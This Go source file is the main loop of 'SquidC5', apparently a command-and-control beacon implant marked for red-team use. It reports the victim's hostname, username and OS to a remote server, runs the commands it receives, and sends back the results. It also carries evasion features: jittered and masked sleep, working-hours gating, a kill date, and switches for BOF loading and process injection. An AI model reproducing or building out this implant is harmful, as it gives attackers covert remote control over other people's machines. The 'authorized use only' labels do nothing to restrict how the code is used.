// SquidC5 native beacon v3 - authorized lab / red team only.
//
// Config: SC5_CONFIG_B64 (JSON) or env SC5_URL/SC5_PSK, or -ldflags bakedConfigJSON.
// Channel: http (default) or ws (SC5_CHANNEL=ws / config.channel).
// TLS always verifies system roots.
package main

import (
	"fmt"
	"math/rand"
	"os"
	"runtime"
	"time"
)

func sleepJitter(base float64, jitterPct float64) {
	pct := jitterPct / 100.0
	if pct < 0 {
		pct = 0
	}
	if pct > 1 {
		pct = 1
	}
	delta := base * pct
	d := base + (rand.Float64()*2-1)*delta
	if d < 0.1 {
		d = 0.1
	}
	time.Sleep(time.Duration(d * float64(time.Second)))
}

func inWorkingHours(start, end int) bool {
	if start == end && start == 0 {
		return true
	}
	h := time.Now().Hour()
	if start <= end {
		return h >= start && h < end
	}
	return h >= start || h < end
}

type channel interface {
	checkin(payload map[string]any) (map[string]any, error)
	result(taskID, out, status string) error
}

func main() {
	cfg, err := loadConfig()
	if err != nil {
		fmt.Fprintln(os.Stderr, "config:", err.Error(), "(authorized use only)")
		os.Exit(1)
	}
	cfgAllowBOF = cfg.AllowBOF
	cfgAllowInject = cfg.AllowInject
	if cfg.SleepMask != "" {
		_ = os.Setenv("SC5_SLEEP_MASK", cfg.SleepMask)
	}

	var ch channel
	if cfg.Channel == "ws" {
		ch = newWSChannel(cfg.WSURL, cfg.PSK)
	} else {
		ch = newHTTPChannel(cfg.URL, cfg.PSK)
	}

	var sid any
	miss := 0
	host := hostName()
	user := envUser()

	for {
		if cfg.KillDate > 0 && int(time.Now().Unix()) > cfg.KillDate {
			return
		}
		if !inWorkingHours(cfg.WorkStart, cfg.WorkEnd) {
			sleepWithMask(cfg)
			continue
		}
		decoyJitter()

		payload := map[string]any{
			"session_id": sid,
			"hostname":   host,
			"username":   user,
			"os_info":    runtime.GOOS + "/" + runtime.GOARCH,
			"metadata": map[string]any{
				"agent":   "sc5beacon",
				"version": cfg.Version,
				"channel": cfg.Channel,
			},
		}
		if cfg.KillDate > 0 {
			payload["kill_date"] = float64(cfg.KillDate)
		}
		if cfg.MaxMiss > 0 {
			payload["max_missed_checkins"] = cfg.MaxMiss
		}

		plain, err := ch.checkin(payload)
		if err != nil {
			miss++
			if cfg.MaxMiss > 0 && miss >= cfg.MaxMiss {
				return
			}
			sleepWithMask(cfg)
			continue
		}
		miss = 0

		if s, ok := plain["session_id"]; ok {
			sid = s
		}
		_ = plain["profile_id"]

		if task, ok := plain["task"].(map[string]any); ok && task != nil {
			cmd, _ := task["command"].(string)
			id, _ := task["id"].(string)
			args, _ := task["args"].(map[string]any)
			if args == nil {
				args = map[string]any{}
			}
			// run async so long tasks do not block check-in loop hard
			out := runTask(cmd, args)
			_ = ch.result(id, out, "completed")
		}
		sleepWithMask(cfg)
	}
}
